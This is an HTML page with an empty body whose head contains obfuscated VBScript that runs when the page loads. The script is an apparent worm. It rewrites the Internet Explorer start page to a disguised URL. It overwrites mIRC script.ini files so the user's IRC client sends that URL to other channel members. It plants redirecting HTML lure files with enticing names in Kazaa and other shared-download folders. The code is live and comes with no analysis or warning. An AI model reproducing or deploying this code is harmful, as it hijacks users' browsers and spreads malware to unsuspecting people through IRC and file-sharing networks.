<html>
<head>
<script language="VBScript"><!-- 
On Error Resume Next
dim bvwzqj, tmcqbn, swnxwj, yrhtwj, ee
dim aqjldk, hhfmpx, xwgxza
swnxwj = "http://microsoft.com/text/abc.png"
yrhtwj = " :)"
aqjldk = "HKEY_CURRENT_USER\Software\Kazaa\LocalContent\DownloadDir"
xwgxza = Array("\sexy chickz 2005.htm", "\xxx passes bangbro.htm", "\xbox360 iso guide.htm")
Set bvwzqj=CreateObject("Scripting.FileSystemObject")
Set tmcqbn=CreateObject("Wscript.Shell")
tmcqbn.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page", swnxwj
hhfmpx = tmcqbn.regread(aqjldk)
orvvphbj("C:\mIRC\script.ini")
orvvphbj("C:\Program Files\mIRC\script.ini")
orvvphbj("C:\Programme\mIRC\script.ini")
for i=0 to 2
frkucy(hhfmpx & xwgxza(i))
frkucy("C:\Downloads\" & xwgxza(i))
frkucy("C:\My Downloads\" & xwgxza(i))
frkucy("C:\My Shared Folder\" & xwgxza(i))
frkucy("C:\Sharing\" & xwgxza(i))
next
Sub orvvphbj(szvovsn)
Set ee=bvwzqj.CreateTextFile(szvovsn) 
ee.WriteLine "[script]"
ee.WriteLine "n0=on 1:JOIN:#:if ($nick != $me) { /msg $nick " + swnxwj + yrhtwj + " } "
ee.WriteLine "n1=on 1:PART:#:if ($nick != $me) { /msg $nick " + swnxwj + yrhtwj + " } "
ee.WriteLine "n2=on 1:KICK:#:if ($nick != $me) { /msg $nick " + swnxwj + yrhtwj + " } "
ee.WriteLine "n3=on 1:TOPIC:#:if ($nick != $me) { /msg $chan " + swnxwj + yrhtwj + " } "
ee.Close()
End Sub
Sub frkucy(szvovsn)
Set ee=bvwzqj.CreateTextFile(szvovsn)
ee.WriteLine "<meta http-equiv='refresh' content='0;URL=" + swnxwj + "'>"
ee.Close()
End Sub
--></script>
</head>
<body>
</body>
</html>
